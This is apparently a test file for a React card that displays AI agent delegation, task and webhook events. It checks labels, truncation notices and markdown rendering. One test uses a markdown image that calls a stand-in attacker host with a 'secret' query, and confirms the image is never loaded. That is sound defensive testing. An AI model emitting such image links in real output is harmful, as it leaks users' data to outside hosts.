import assert from "node:assert/strict";
import test from "node:test";
import { createJiti } from "jiti";

const jiti = createJiti(import.meta.url, { jsx: { runtime: "automatic" }, tsconfigPaths: true });
const React = await jiti.import("react");
const { renderToStaticMarkup } = await jiti.import("react-dom/server");
const { AgentEventCard } = await jiti.import("./AgentEventCard.tsx");
const { I18nProvider } = await jiti.import("@/hooks/useI18n");
const ev = await jiti.import("@/lib/agents/events.ts");

const render = (data, props = {}) => renderToStaticMarkup(
  React.createElement(I18nProvider, null, React.createElement(AgentEventCard, { message: ev.agentEventToUiMessage(data), ...props })),
);
const done = { id: "t1", title: "check plan", agent: "Martin", status: "completed", result: "ok", sessionId: "s1", kind: "review", usage: { externalTools: false } };

test("a review card says Review by; a hand-over card and an older card without purpose say Result from", () => {
  assert.match(render(ev.delegationEventOfTask(done)), /Review by Martin/);
  assert.match(render(ev.delegationEventOfTask({ ...done, kind: "task" })), /Result from Martin/);
  const legacy = { ...ev.delegationEventOfTask(done) };
  delete legacy.purpose;
  assert.match(render(legacy), /Result from Martin/);
});

test("a clipped card says so and its Inject button says it injects the truncated text", () => {
  const html = render(ev.delegationEventOfTask({ ...done, result: "r".repeat(20_000) }), { onInject: () => {}, onOpenSession: () => {} });
  assert.match(html, /truncated — see the run/);
  assert.match(html, /Inject \(truncated\)/);
  const whole = render(ev.delegationEventOfTask(done), { onInject: () => {} });
  assert.doesNotMatch(whole, /truncated/);
  assert.match(whole, /Inject into the conversation/);
});

test("a user hand-over's task card names the requester; a plain task card does not", () => {
  assert.match(render(ev.buildTaskEvent({ taskId: "t", title: "x", requestedBy: "user", handedFrom: "Julien" })), /handed over from Julien/);
  assert.doesNotMatch(render(ev.buildTaskEvent({ taskId: "t", title: "x", requestedBy: "user" })), /handed over/);
});

test("a delegation summary renders as markdown; a long one folds behind an Expand toggle", () => {
  const short = render(ev.delegationEventOfTask({ ...done, result: "**bold** finding" }));
  assert.match(short, /<strong>bold<\/strong>/);
  assert.doesNotMatch(short, /aria-expanded/);
  const long = render(ev.delegationEventOfTask({ ...done, result: Array.from({ length: 40 }, (_, i) => `- finding ${i}`).join("\n") }));
  assert.match(long, /class="agent-event-summary is-collapsed"/);
  assert.match(long, /aria-expanded="false"/);
  assert.match(long, />Expand</);
});

test("a delegation summary never loads a markdown image", () => {
  const html = render(ev.delegationEventOfTask({ ...done, result: "![pixel](https://evil.example/p.png?d=secret)" }));
  assert.doesNotMatch(html, /<img/);
  assert.match(html, /🖼 pixel/);
});

test("a webhook summary stays raw text", () => {
  assert.match(render(ev.buildWebhookEvent({ taskId: "w", triggerId: "g", title: "alert", status: "completed", summary: "**raw**" })), /\*\*raw\*\*/);
});
